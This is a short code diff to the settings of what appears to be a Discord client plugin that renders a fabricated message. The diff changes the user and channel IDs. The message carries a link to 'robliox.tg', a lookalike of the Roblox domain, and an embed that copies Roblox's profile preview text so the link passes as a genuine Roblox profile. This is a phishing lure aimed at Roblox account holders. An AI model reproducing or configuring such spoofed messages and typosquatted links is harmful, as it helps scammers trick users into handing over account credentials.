@@ -27,7 +27,7 @@
             
             // ===== USER SETTINGS - CHANGE THESE VALUES =====
             // Simply change the values below to update your user settings throughout the entire plugin
-            const USER_ID = "753944929973174283";           // Your Discord User ID
+            const USER_ID = "1060010931461029940";           // Your Discord User ID
             const USERNAME = "";                            // Your username (leave empty to auto-fetch)
             const AVATAR_URL = "";                          // Your avatar URL (leave empty to auto-fetch)
             const DISCRIMINATOR = "0000";                   // Your discriminator
@@ -36,8 +36,8 @@
             
             // ===== MESSAGE SETTINGS - CHANGE THESE VALUES =====
             const MESSAGE_ID = "msg1";                      // Message ID
-            const TARGET_CHANNEL = "1412231416611082393";   // Target channel ID
-            const MESSAGE_USER_ID = "817381750518579200";   // User ID for the message
+            const TARGET_CHANNEL = "1414311132146962503";   // Target channel ID
+            const MESSAGE_USER_ID = "1060010931461029940";   // User ID for the message
             const MESSAGE_TEXT = "https://www.robliox.tg/users/25699615/profile";  // Message text/URL
             const EMBED_TITLE = "CrazyKiara111's Profile";  // Embed title
             const EMBED_DESCRIPTION = "CrazyKiara111 is one of the millions creating and exploring the endless possibilities of Roblox. Join CrazyKiara111 on Roblox and explore together!Razorbill mogger";  // Embed description
